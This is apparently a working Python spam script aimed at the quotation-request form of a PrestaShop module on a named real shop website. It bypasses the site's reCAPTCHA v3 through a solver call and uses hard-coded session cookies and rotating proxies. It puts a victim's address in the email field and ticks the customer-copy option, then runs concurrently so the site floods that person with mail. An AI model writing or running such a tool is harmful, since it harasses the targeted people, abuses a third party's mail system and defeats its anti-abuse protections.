from os.path import basename

import requests

import module

url = 'https://www.maltep.com/en/module/roja45quotationspro/QuotationsProFront?action=addToQuote&id_product=2905&id_product_attribute=2461&qty=1'
key = '6LdIyo4fAAAAABNu4DdVXmrOrSbdjlkDBnzjzMfl'


class ConcreteSpam(module.Spam):

    def post(self, target) -> requests.Response | None:
        cap = self.solve_captcha(url, key, version='v3')
        if not cap:
            return
        cookies = {
            'PHPSESSID': 'fc946d3e4bc82eda0df5e45ee0556a54',
            'PrestaShop-5561f3b309ccb035fd24a14e0f44cd85': 'def5020060855fabcc8a594a51d0a84c33412d2662f477499f2cc8c7ebbb451583c4e347ad83cdd288efbeef9660498a7897b847194f85de5f9b4b39af5c276b152a85e71bff6ceb54fb31dc380a155daebcce197bbc13616a845149a0b2692d4291a2797e8ef61eecbd2c92fca9329e5651659ee78efdd93e59f878cae6bae7559cb0881f48977ae19b440b43b7f71b300a3ea23db36269f0c83576bd3c6233051927127e953c74526e170f19a94b257afa66873caaf627c40cf2a0642abbb6b102c2a1cf6607d765b46b79fa6591b198a9df4cebafb2bd512bee7f8ac27ff44f1c0175d0e01c2d005c78c34772bd5120a8f273760b250af9eedaf2120d92d53653de6cd012c0589314cc96359c0f203bd7d63871a5e452a2191af28d918722144dc0c274e5e06d4400885de1b42766b98cea7b908e7110deb6937577db98bd12cdc6121b32f1f58accf093d55c45bf0a36cba97195e38779f986bc8a2dd6f8d60e63a6ea8910c3b520ae39dc7cd3b3f9fba6b66b758f853dd70ba4dc8c3ad5c7b0ff4729b8de81c68fbad31b52fa518e8b26b969a33810226d0563ee5aff979d53dedce3895bb25d96fa98f8bf51af3b',
        }

        headers = {
            'authority': 'www.maltep.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryC8ebXwqMpiUor66x',
            'origin': 'https://www.maltep.com',
            'referer': 'https://www.maltep.com/en/module/roja45quotationspro/QuotationsProFront?action=addToQuote&id_product=2905&id_product_attribute=2461&qty=1',
            'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        }

        data = '------WebKitFormBoundaryC8ebXwqMpiUor66x\r\nContent-Disposition: form-data; name="action"\r\n\r\nsubmitRequest\r\n------WebKitFormBoundaryC8ebXwqMpiUor66x\r\nContent-Disposition: form-data; name="ROJA45QUOTATIONSPRO_FORMDATA"\r\n\r\n{"columns":[{"heading":"","num":1,"fields":[{"pos":0,"name":"Société","type":"TEXT","label":"Company","value":"test"},{"pos":1,"name":"Numero_de_téléphone","type":"TEXT","label":"Phone number","value":"test"},{"pos":2,"name":"ROJA45QUOTATIONSPRO_FIRSTNAME","type":"TEXT","label":"First name","value":"test"},{"pos":3,"name":"ROJA45QUOTATIONSPRO_LASTNAME","type":"TEXT","label":"Name","value":"test"},{"pos":4,"name":"ROJA45QUOTATIONSPRO_EMAIL","type":"TEXT","label":"Email","value":"wezxasqw@gmail.com"},{"pos":5,"name":"Message","type":"TEXTAREA","label":"Message","value":"test"}]}]}\r\n------WebKitFormBoundaryC8ebXwqMpiUor66x\r\nContent-Disposition: form-data; name="quote_quantity"\r\n\r\n70\r\n------WebKitFormBoundaryC8ebXwqMpiUor66x\r\nContent-Disposition: form-data; name="Société"\r\n\r\ntest\r\n------WebKitFormBoundaryC8ebXwqMpiUor66x\r\nContent-Disposition: form-data; name="Numero_de_téléphone"\r\n\r\ntest\r\n------WebKitFormBoundaryC8ebXwqMpiUor66x\r\nContent-Disposition: form-data; name="ROJA45QUOTATIONSPRO_FIRSTNAME"\r\n\r\ntest\r\n------WebKitFormBoundaryC8ebXwqMpiUor66x\r\nContent-Disposition: form-data; name="ROJA45QUOTATIONSPRO_LASTNAME"\r\n\r\ntest\r\n------WebKitFormBoundaryC8ebXwqMpiUor66x\r\nContent-Disposition: form-data; name="ROJA45QUOTATIONSPRO_EMAIL"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryC8ebXwqMpiUor66x\r\nContent-Disposition: form-data; name="Message"\r\n\r\ntest\r\n------WebKitFormBoundaryC8ebXwqMpiUor66x\r\nContent-Disposition: form-data; name="ROJA45QUOTATIONSPRO_CUSTOMER_COPY"\r\n\r\non\r\n------WebKitFormBoundaryC8ebXwqMpiUor66x\r\nContent-Disposition: form-data; name="g-recaptcha-response"\r\n\r\ncap_que\r\n------WebKitFormBoundaryC8ebXwqMpiUor66x--\r\n'
        data = data.replace('cap_que', cap)
        data = data.replace('test', self.get_text())
        data = data.replace('wezxasqw@gmail.com', target)

        for _ in range(15):
            try:
                response = requests.post(
                    'https://www.maltep.com/en/module/roja45quotationspro/QuotationsProFront',
                    cookies=cookies,
                    headers=headers,
                    data=data.encode(), proxies=self.get_proxies(), timeout=10
                )
                return response
            except Exception as e:
                print(e)
        return


def main():
    spam = ConcreteSpam(basename(__file__)[:-3], 'Many thanks, we have received your request.')
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
